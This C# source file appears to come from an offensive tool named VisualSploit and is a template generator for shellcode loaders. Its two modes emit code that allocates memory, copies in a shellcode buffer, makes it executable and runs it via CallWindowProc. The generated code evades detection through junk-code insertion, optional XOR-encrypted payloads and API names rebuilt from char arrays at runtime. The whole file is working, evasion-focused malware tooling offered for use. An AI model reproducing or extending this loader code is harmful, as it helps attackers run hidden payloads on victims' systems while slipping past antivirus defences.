using VisualSploit.Core;

namespace VisualSploit.Templates;
internal record LoaderParts(string Declarations, string Body);

internal static class Loader
{
    // For encrypted mode: dynamic resolution with delegates at class level
    private const string DynamicDeclarations = """
        [System.Runtime.InteropServices.DllImport("kernel32")]
        static extern System.IntPtr LoadLibrary(string n);
        [System.Runtime.InteropServices.DllImport("kernel32")]
        static extern System.IntPtr GetProcAddress(System.IntPtr m, string p);

        delegate System.IntPtr AllocHandler(System.IntPtr a, uint s, uint t, uint p);
        delegate bool ProtectHandler(System.IntPtr a, uint s, uint p, out uint o);
        delegate System.IntPtr CallHandler(System.IntPtr f, System.IntPtr h, uint m, System.IntPtr w, System.IntPtr l);
        """;

    // Fragment mode: must use DllImport (can't define delegate types in method body)
    public static string Generate(ShellcodePayload p, Config cfg, Random rng, Naming naming)
    {
        var (scSection, bufVar) = GetShellcodeSection(p, cfg, "buffer");

        return $$"""
                      [System.Runtime.InteropServices.DllImport("kernel32", SetLastError = true)]
                      static extern System.IntPtr VirtualAlloc(System.IntPtr a, uint s, uint t, uint p);

                      [System.Runtime.InteropServices.DllImport("kernel32", SetLastError = true)]
                      static extern bool VirtualProtect(System.IntPtr a, uint s, uint p, out uint o);

                      [System.Runtime.InteropServices.DllImport("user32", SetLastError = true)]
                      static extern System.IntPtr CallWindowProc(System.IntPtr f, System.IntPtr h, uint m, System.IntPtr w, System.IntPtr l);

                      {{Junk.Get(cfg, naming, rng)}}{{scSection}}
                      var length = ((uint){{bufVar}}.Length + 0xFFFu) & ~0xFFFu;
                      var handle = VirtualAlloc(System.IntPtr.Zero, length, 1u << 12, 4u);
                      System.Runtime.InteropServices.Marshal.Copy({{bufVar}}, 0, handle, {{bufVar}}.Length);

                      uint prev; {{Junk.Get(cfg, naming, rng)}}VirtualProtect(handle, length, 32u, out prev);
                      CallWindowProc(handle, System.IntPtr.Zero, 0, System.IntPtr.Zero, System.IntPtr.Zero);
                      """;
    }

    // Encrypted mode: full dynamic resolution
    public static LoaderParts Encrypted(ShellcodePayload p, Config cfg, Random rng, Naming naming)
    {
        var (scSection, bufVar) = GetShellcodeSection(p, cfg, "buffer");

        // Build API names from char arrays at runtime
        var body = $$"""
            {{Junk.Get(cfg, naming, rng)}}var k32 = new string(new char[]{'k','e','r','n','e','l','3','2'});
            var u32 = new string(new char[]{'u','s','e','r','3','2'});
            var m1 = LoadLibrary(k32);
            var m2 = LoadLibrary(u32);

            var fnA = new string(new char[]{'V','i','r','t','u','a','l','A','l','l','o','c'});
            var fnP = new string(new char[]{'V','i','r','t','u','a','l','P','r','o','t','e','c','t'});
            var fnC = new string(new char[]{'C','a','l','l','W','i','n','d','o','w','P','r','o','c','A'});

            var pA = (AllocHandler)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(GetProcAddress(m1, fnA), typeof(AllocHandler));
            var pP = (ProtectHandler)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(GetProcAddress(m1, fnP), typeof(ProtectHandler));
            var pC = (CallHandler)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(GetProcAddress(m2, fnC), typeof(CallHandler));

            {{Junk.Get(cfg, naming, rng)}}{{scSection}}
            var length = ((uint){{bufVar}}.Length + 0xFFFu) & ~0xFFFu;
            var handle = pA(System.IntPtr.Zero, length, 1u << 12, 4u);
            System.Runtime.InteropServices.Marshal.Copy({{bufVar}}, 0, handle, {{bufVar}}.Length);

            uint prev; {{Junk.Get(cfg, naming, rng)}}pP(handle, length, 32u, out prev);
            pC(handle, System.IntPtr.Zero, 0, System.IntPtr.Zero, System.IntPtr.Zero);
            """;

        return new LoaderParts(DynamicDeclarations, body);
    }

    private static (string Section, string BufVar) GetShellcodeSection(ShellcodePayload p, Config cfg, string varName)
    {
        if (cfg.Has(Methods.Xor))
            return (p.Decrypt, "buffer");

        return ($"var {varName} = new byte[] {{ {Utils.Hex(p.Data)} }};\n", varName);
    }
}
